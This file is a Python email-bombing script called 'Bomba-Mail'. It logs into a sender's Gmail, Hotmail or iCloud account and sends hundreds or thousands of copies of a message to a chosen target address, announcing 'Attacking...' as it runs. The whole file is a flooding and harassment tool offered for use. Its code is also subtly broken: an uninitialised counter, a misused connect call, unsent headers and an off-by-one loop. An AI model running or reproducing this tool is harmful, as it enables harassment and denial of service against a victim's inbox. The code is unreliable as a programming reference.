import smtplib
import sys

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    
def banner():
    print(bcolors.OKGREEN + '+[+[+[ Bomba-Mail ]+]+]+')
    print(bcolors.OKGREEN + '+[+[+[ made with Python')
    print(bcolors.OKGREEN + r'''
          
                  _____              ____                  _               
 |  __ \            |  _ \                | |              
 | |  | | ___ _ __  | |_) | ___  _ __ ___ | |__   ___ _ __ 
 | |  | |/ _ \ '__| |  _ < / _ \| '_ ` _ \| '_ \ / _ \ '__|
 | |__| |  __/ |    | |_) | (_) | | | | | | |_) |  __/ |   
 |_____/ \___|_|    |____/ \___/|_| |_| |_|_.__/ \___|_|   
                                                            
                            . . .                         
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⠤⠖⠛⣷⣶⣶⠿⢿⣿⣿⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⣾⣿⠋⠀⠀⠀⢾⣿⠏⠀⠀⠀⠀⠈⠛⠻⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠙⠛⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢻⣷⣶⣦⣤⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣠⣤⣤⣠⣶⣿⡅⠀⠀⠀⣤⣤⣴⣶⠗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠆⠀⠹⣷⣤⡀⠀⠀⠀⠀⠀
⠀⠀⣰⡿⠋⠉⢹⣿⠁⠉⠀⠀⠀⠀⠀⣿⠏⠀⠀⠀⠀⢀⣠⣤⠀⠀⠀⠀⠲⣤⣄⣀⣀⠀⠀⠀⠙⢻⣷⣦⡀⠀⠀⠀
⠀⣰⣿⠇⠀⠀⠸⠿⠂⠀⠀⠀⠀⠀⠀⠟⠀⠀⠀⠀⠠⣿⡏⠁⠀⠀⠀⠀⠀⠈⢿⠁⠀⠀⠀⠀⠀⠸⣿⠉⢿⣆⠀⠀
⢰⣿⡁⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⣦⡀⠛⢿⣦⠀⠀⡀⠀⠀⠀⠘⠀⠀⠀⠀⠀⠀⠀⠛⢀⠀⣿⡄⠀
⢸⡿⠁⠀⠀⢿⣄⠀⡀⠀⠀⠀⠀⢀⣤⣀⣀⣀⣤⣿⣷⣶⡿⠻⣿⣿⠿⣷⣦⣄⣸⣷⠀⠀⠀⢠⣄⠀⠀⠈⠛⠿⣿⠀
⠸⣿⣾⠃⠀⠀⠛⠿⠃⠀⠀⠰⣤⣴⣿⠿⠿⠿⠿⠛⠉⠉⠀⠀⡄⠀⢰⣿⠟⢿⣿⣿⣄⡀⢰⣿⡟⠀⠀⠀⠀⠀⢹⡇
⠀⢸⣿⢸⡆⠀⠶⠿⠀⣀⡀⠠⣬⣭⣭⣀⠀⣆⠀⠀⢠⠀⠀⣰⠃⣰⣿⣿⠏⠀⠀⣉⣿⣿⠀⠙⠷⠀⠀⢠⣶⡀⣸⣧
⠀⠸⣿⣿⣷⡄⠀⠀⠘⠋⠁⠀⠀⠀⠉⡛⢷⣽⣦⠀⢸⡄⠀⣿⢀⣿⣿⣿⡶⠒⠛⢋⡅⠀⠀⠀⢀⣴⢀⡼⠟⠛⠟⠁
⠀⠀⠈⠙⠻⣷⣶⣦⣴⡾⠛⠶⠦⣶⠾⢿⣶⣬⣿⡆⠸⣧⢠⡇⢸⣿⣿⣭⣥⣄⣀⣈⣤⣶⣦⣴⣿⠟⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⣽⣿⠀⢿⠈⣧⣼⢹⣿⣀⣀⠉⠛⠛⠉⠀⠈⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡶⢿⡛⢹⣿⡄⠸⠇⣿⡇⠘⣿⡉⢉⣛⠳⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⡿⢛⣉⣣⣾⣿⠛⣿⣷⠀⡀⢸⣇⢸⡟⠛⣿⡇⢠⡟⢿⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣅⠀⠀⡉⠛⢿⣅⣀⣿⣿⠀⣿⣄⣉⣹⣧⡴⢾⣯⡀⠈⠋⠉⢻⣿⡀⠀⠀⠀⠀⠀⠀⠀   Author: CarlosHenri05
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣏⣀⣾⣏⠀⠀⠈⠙⠿⠿⠋⢻⡟⠋⠛⢿⡀⠀⠸⠀⠀⣀⠀⠀⣽⣿⡆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⠿⢿⣷⣀⣀⣼⣦⠀⠀⠀⢁⣀⣠⣶⡀⠀⣀⣀⣀⣼⣤⣾⣿⡿⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠿⠿⣿⣷⣶⣿⠿⠟⣿⠛⠿⣶⣿⣿⠿⠋⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⣰⠃⣿⡇⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⢻⣇⠀⣿⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠘⣿⠀⣿⠀⢿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⢿⣿⠀⣿⠀⣿⡆⠸⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣯⣾⡟⠀⠁⠀⢿⣇⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠋⣻⣷⠿⠋⠀⡀⠀⠀⠸⢿⡄⠀⢻⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠖⠛⠁⠀⠀⣰⠇⠀⠀⠀⠀⠀⠀⠀⠈⠙⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                      ''')
    
    
    
class Bomber: 
    def __init__(self):
        try:
            print(bcolors.WARNING + '+[+[+[ Program initializing]+]+]+  ')
            self.options = int(input(bcolors.WARNING + '+[+[+[ Choose options: 1 - 1000msgs | 2 - 500msgs | 3 - 250msgs | 4 - custom'))
            if int(self.options) > int(4) or int(self.options) < int(1):
                print("Invalid option, choose again.")
                sys.exit(0)
            if self.options==4:
                self.custom = int(input("Choose how many total messages you want: "))
        except Exception as e:
            print(f"Error! {e}")
    
    def bomb(self):
       try:
           print(bcolors.WARNING + 'Setting up bomb: ')
           self.amount = None
           if self.options == 1:
               self.amount = 1000
           elif self.options == 2:
               self.amount = 500
           elif self.options == 3:
               self.amount = 250
           elif self.options == 4:
               self.amount = self.custom 
       except Exception as e:
           print(f'ERROR: {e}')    
            
            
    def email(self):
        try:
            self.server = int(input(bcolors.WARNING + "Choose email server/format: 1 - Gmail | 2 - Hotmail | 3 - iCloud "))
            premade_list = [1,2,3]
            default_port = True
            if self.server not in premade_list:
                default_port = False
                self.port = int(input("Enter port number: "))
            else: 
                if self.server in premade_list:
                    case = {
                        1: ['smtp.gmail.com', 587 ],
                        2: ['smtp-mail.outlook.com', 587], 
                        3: ['smtp.mail.me.com', 587] 
                    }
                    self.smtp_server, self.port = case[self.server]
            print(f"Server: {self.smtp_server} / Port: {self.port}")
            self.target = str(input(bcolors.WARNING + "Enter target email:"))
            self.sender = str(input(bcolors.WARNING + "Enter sender email:"))
            self.password = str(input(bcolors.WARNING + "Enter sender password: "))
            self.subject = str(input(bcolors.WARNING + "Enter subject: "))
            self.message = str(input(bcolors.WARNING + "Enter message: "))
            
            self.s = smtplib.SMTP(self.smtp_server,self.port)
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.sender, self.password)
            
            self.msg = f"From: {self.sender}\nTo: {self.target}\nSubject: {self.subject}\n\n{self.message}"
            
        except Exception as e:
            print(f"Error! {e}")
            
    def send(self):
        try:
            self.s.connect(self.sender,self.target,self.message)
            self.s.sendmail(self.sender,self.target,self.message)
            self.count+=1
        except Exception as e:
            print(f"Error in send {e}")
            
            
            
    def attack(self):
        print(bcolors.WARNING + '\n+[+[+[ Attacking... ]+]+]+')
        for email in range(self.amount+1):
            self.send()
        self.s.close()
        print(bcolors.WARNING + '\n+[+[+[ Attack finished ]+]+]+')
        sys.exit(0)
            
            
    def start(self):
        try:
            self.bomb()
            self.email()
            self.send()
            self.attack()
        except Exception as e:
            print(f"Error! {e}")
        

if __name__ == '__main__':
    banner()
    bomb = Bomber()
    bomb.start()
    
            
                    
            
            
        